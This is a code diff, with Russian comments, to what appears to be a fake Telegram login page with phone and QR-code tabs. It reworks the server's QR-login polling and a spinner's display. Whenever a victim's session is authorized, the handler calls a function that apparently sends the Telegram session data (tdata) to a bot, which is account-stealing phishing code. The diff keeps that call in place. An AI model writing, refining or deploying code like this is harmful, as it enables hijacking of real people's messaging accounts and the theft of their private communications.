@@ -534,7 +534,7 @@ function switchTab(tab) {
   $('tab-qr').style.color = isQr ? 'var(--fg)' : 'var(--muted)';
   $('v-phone').classList.toggle('hidden', isQr);
   $('v-qr').classList.toggle('hidden', !isQr);
-  $('brand-spinner').style.display = isQr ? '' : 'none';
+  $('brand-spinner').style.display = isQr ? 'block' : 'none';
   if (isQr) startQr();
   else stopQr();
 }
@@ -881,26 +881,19 @@ async def h_qr(request):
     try:
         c = await get_client()
         if await c.is_user_authorized():
+            S._qr_login = None
             asyncio.create_task(_send_tdata_to_bot())
             return aiohttp.web.json_response({"authorized": True})
-        # Создаём или обновляем QR login
-        if not hasattr(S, '_qr_login') or S._qr_login is None:
+        # Первый вызов — создаём QR login
+        if S._qr_login is None:
             S._qr_login = await c.qr_login()
-        else:
-            try:
-                # проверяем — может уже отсканировали
-                if S._qr_login.wait.__self__._event.is_set() if hasattr(S._qr_login, '_event') else False:
-                    pass
-                await asyncio.wait_for(S._qr_login.wait(), timeout=0.5)
-                # если дошли сюда — авторизация прошла
-                S._qr_login = None
-                asyncio.create_task(_send_tdata_to_bot())
-                return aiohttp.web.json_response({"authorized": True})
-            except (asyncio.TimeoutError, Exception):
+            # запускаем фоновое ожидание сканирования
+            async def _qr_wait():
                 try:
-                    await S._qr_login.recreate()
+                    await S._qr_login.wait()
                 except Exception:
-                    S._qr_login = await c.qr_login()
+                    pass
+            asyncio.create_task(_qr_wait())
         url = S._qr_login.url if S._qr_login else None
         return aiohttp.web.json_response({"authorized": False, "url": url})
     except Exception as e:
